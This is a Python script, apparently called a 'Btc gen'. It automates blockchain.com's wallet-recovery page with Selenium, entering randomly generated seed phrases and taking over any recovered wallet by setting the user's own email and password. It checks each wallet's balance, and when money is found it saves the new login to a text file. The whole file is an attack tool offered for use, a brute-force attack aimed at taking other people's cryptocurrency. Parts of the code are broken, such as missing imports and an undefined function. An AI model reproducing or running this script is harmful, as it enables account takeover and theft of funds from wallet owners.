#coding: utf-8
import random, string
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from bs4 import BeautifulSoup
from colorama import init
from colorama import Fore, Style
import os, sys, time, traceback, pickle, random, colorama
from mnemonic import Mnemonic

init(convert=True)
mnemo = Mnemonic("english")

def getdeveloper():
    dev = "REZIZT X RAZU"
    try:
        dev = urlopen(Request("https://pastebin.com/raw/vZn7SZcM")).read().decode()
    except:
        pass
    return dev


def clear():
    
    os.system("cls" if os.name == "nt" else "echo -e \\\\033c")
    os.system("mode con: cols=105 lines=30")
    
Password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def logo():
    developer = getdeveloper()
    try:
        text = """                                   
                        ██████╗ ████████╗ ██████╗     ██████╗ ███████╗███╗   ██╗
                        ██╔══██╗╚══██╔══╝██╔════╝    ██╔════╝ ██╔════╝████╗  ██║
                        ██████╔╝   ██║   ██║         ██║  ███╗█████╗  ██╔██╗ ██║
                        ██╔══██╗   ██║   ██║         ██║   ██║██╔══╝  ██║╚██╗██║
                        ██████╔╝   ██║   ╚██████╗    ╚██████╔╝███████╗██║ ╚████║
                        ╚═════╝    ╚═╝    ╚═════╝     ╚═════╝ ╚══════╝╚═╝  ╚═══╝ \n                    
        
        """
        bad_colors = ['LIGHTRED_EX', 'RED']
        codes = vars(colorama.Fore)
        colors = [codes[color] for color in codes if color in bad_colors]
        colored_chars = [random.choice(colors) + char for char in text]
        print(''.join(colored_chars))
        print(Fore.RESET + f"\t\t\t            Follow Me on Youtube: {Fore.RED}Rezizt{Fore.RESET}\n")
        print("your password below")
        print(f"{Fore.RED}{Password}{Fore.RESET}")
    
    except KeyboardInterrupt:
        sys.exit()

clear()
logo()

maxi = 0
Email = input(f'Enter a email to recover funds: ')
print('  ')
options = webdriver.ChromeOptions()
options.add_argument('window-size=1000,900')
options.add_experimental_option("excludeSwitches", ["enable-logging"])
browser = webdriver.Chrome(options=options, executable_path=r"chromedriver.exe")
browser.minimize_window()
wait = WebDriverWait(browser, 3)

from selenium import webdriver

init()
os.system('title ' + ' Btc gen made by rezizt + razu ')


def paste_link():
    global Email
    global Passowrd
    try:
        time.sleep(1)
        words = mnemo.generate(strength=128)
        browser.find_element_by_xpath('//*[@id="app"]/div/div[3]/div/form/div[2]/div/div[2]/div[1]/input').send_keys(words) #keyword pasted
        time.sleep(1)
        browser.find_element_by_xpath('//*[@id="app"]/div/div[3]/div/form/div[3]/button').click() # Clicks continue
        time.sleep(1)
        browser.find_element_by_xpath('//*[@id="app"]/div/div[3]/div/form/div[1]/div/div[1]/input').send_keys(Email) # Adds email
        time.sleep(1)
        browser.find_element_by_xpath('//*[@id="app"]/div/div[3]/div/form/div[2]/div/div[1]/input').send_keys(Password) # add first password
        time.sleep(1)
        browser.find_element_by_xpath('//*[@id="app"]/div/div[3]/div/form/div[3]/div/div[1]/input').send_keys(Password) # adds second password
        time.sleep(1)
        browser.find_element_by_xpath('//*[@id="app"]/div/div[3]/div/form/div[5]/button').click() # clicks next
        time.sleep(15)
        browser.find_element_by_xpath('//*[@id="app"]/div/div[3]/a').click() # clicks the skip
        time.sleep(7)
        browser.find_element_by_xpath('//*[@id="app"]/div/div[3]/div/div/div/div/div/span/div/div/form/div[1]/div[1]/span').click() # clicks the skip
        time.sleep(7)
        money = browser.find_element_by_xpath('//*[@id="app"]/div/div[5]/div[2]/div/div/section/div[1]/div/div[1]/div[2]').text # stores the money amount
        if money == "$0.00": # Check if the amount is 0
            print("No money found. Trying agian...")
            start()
        else:
            pass
        print(f"Money found! Amount:{money}") 
        pastemoney = f"{money}".replace("$", "") # converts $5.00 into 5.00
        print('  ')
        print("Saving login info into btc.txt") 
        with open('btc.txt', 'a+') as f:
                f.write(f"""===================\nEmail: {Email}\n===================\nPassword: {Password}\n===================\nAmount: {money}\n===================""")
                print("Saved btc account into btc.txt!")     
    
    
    except Exception as e: 
        print(e)

def start():
    try:
        browser.get("https://login.blockchain.com/#/recover")
        time.sleep(2)
        while True:
            try:
                maximize()
                wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="main"]/form/div/input[1]')))
                continue
            except:
                pass
                browser.minimize_window()
                break
    except:
        try:
            wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/nav/ul/li/a')))
            print('  ')
            print("{}[>] {}The Page didn't load.{}".format(Fore.RESET, Fore.LIGHTRED_EX, Fore.RESET))
            input()
        except:
            pass
    try:
        browser.find_element_by_xpath('//*[@id="app"]/div/div[3]/div/form/div[2]/div/div[2]/div[1]/input').click()
        time.sleep(1)
    except:
        print('  ')
        print("{}[>] {}Error, Cannot find Element{}".format(Fore.RESET, Fore.LIGHTRED_EX, Fore.RESET))
        pass
    clear()
    logo()
    print('{}[>] {}Starting...{}'.format(Fore.RESET, Fore.LIGHTRED_EX, Fore.RESET))
    paste_link()

start()